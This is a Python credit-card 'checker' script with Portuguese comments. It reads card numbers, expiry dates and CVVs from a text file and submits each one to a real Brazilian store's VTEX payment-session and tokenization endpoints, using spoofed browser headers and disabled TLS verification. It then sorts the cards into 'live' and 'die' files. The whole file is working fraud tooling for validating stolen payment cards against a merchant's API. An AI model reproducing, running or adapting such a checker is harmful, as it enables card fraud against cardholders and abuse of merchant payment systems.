import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Cabeçalhos HTTP
headers = {
    'Host': 'www.rissul.com.br',
    'sec-ch-ua-platform': '"Windows"',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'accept': '*/*',
    'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'content-type': 'application/json',
    'sec-ch-ua-mobile': '?0',
    'sec-gpc': '1',
    'accept-language': 'en-US,en;q=0.5',
    'origin': 'https://www.rissul.com.br',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.rissul.com.br/account',
    'priority': 'u=1, i',
}

# Parâmetros da requisição inicial
params = {
    'workspace': 'master',
    'maxAge': 'long',
    'appsEtag': 'remove',
    'domain': 'store',
    'locale': 'pt-BR',
}

# Função para ler e processar o arquivo
def read_card_data(file_path):
    with open(file_path, 'r') as file:
        card_data = []
        for line in file:
            # Verifica o delimitador
            if ':' in line:
                parts = line.strip().split(':')
            elif '|' in line:
                parts = line.strip().split('|')
            else:
                continue
            card_data.append({
                'cardNumber': parts[0],
                'expiryMonth': parts[1],
                'expiryYear': parts[2],
                'csc': parts[3],
            })
        return card_data

# Lê os dados do arquivo
cards = read_card_data('db.txt')

# Arquivos para salvar resultados
live_file = 'live.txt'
die_file = 'die.txt'

# Loop para testar cada cartão
for card in cards:
    json_data = {
        'operationName': 'CreatePaymentSession',
        'variables': {},
        'extensions': {
            'persistedQuery': {
                'version': 1,
                'sha256Hash': 'a63c0a90abc6f9751c50867b7a725999476ec35cfada82818be436fc6a168e53',
                'sender': 'vtex.my-cards@1.x',
                'provider': 'vtex.my-cards-graphql@2.x',
            },
        },
    }

    response = requests.post('https://www.rissul.com.br/_v/private/graphql/v1', params=params, headers=headers, json=json_data, verify=False)

    if response.status_code == 200 and 'PaymentSession' in response.text:
        idSessionPaymeent = response.json()['data']['createPaymentSession']['id']

        # Atualiza os dados do cartão para a próxima requisição
        json_data = [
            {
                'cardNumber': card['cardNumber'],
                'cardHolder': 'Test User',
                'expiryDate': f"{card['expiryMonth']}/{card['expiryYear'][2:]}",
                'csc': card['csc'],
                'address': {
                    'addressId': 'w4pmbusyhq',
                    'addressType': 'residential',
                    'city': 'São Paulo',
                    'complement': None,
                    'country': 'BRA',
                    'geoCoordinates': [-43.009239196777314, -6.771692245483398],
                    'neighborhood': 'Bela Vista',
                    'number': '1000',
                    'postalCode': '01311-000',
                    'receiverName': 'NOT EMPTY',
                    'reference': None,
                    'state': 'SP',
                    'street': 'Avenida Paulista',
                    'addressQuery': '',
                },
            },
        ]

        response = requests.post(
            f'https://superrissul.vtexpayments.com.br/api/pub/sessions/{idSessionPaymeent}/tokens',
            headers=headers,
            json=json_data,
            verify=False
        )

        result = f"Cartão: {card['cardNumber']} | Validade: {card['expiryMonth']}/{card['expiryYear']} | CVV: {card['csc']}"

        if response.status_code == 200:
            print(f"[LIVE] {result}")
            with open(live_file, 'a') as live:
                live.write(f"{card['cardNumber']}|{card['expiryMonth']}/{card['expiryYear']}|{card['csc']}\n")
        else:
            print(f"[DIE] {result}")
            with open(die_file, 'a') as die:
                die.write(f"{card['cardNumber']}|{card['expiryMonth']}/{card['expiryYear']}|{card['csc']}\n")
    else:
        result = f"Cartão: {card['cardNumber']} | Validade: {card['expiryMonth']}/{card['expiryYear']} | CVV: {card['csc']}"
        print(f"[DIE] {result}")
        with open(die_file, 'a') as die:
            die.write(f"{card['cardNumber']}|{card['expiryMonth']}/{card['expiryYear']}|{card['csc']}\n")


# t.me/pugno_yt
# https://community.vtex.com/t/pagamento-integrando-sem-nome/37044/3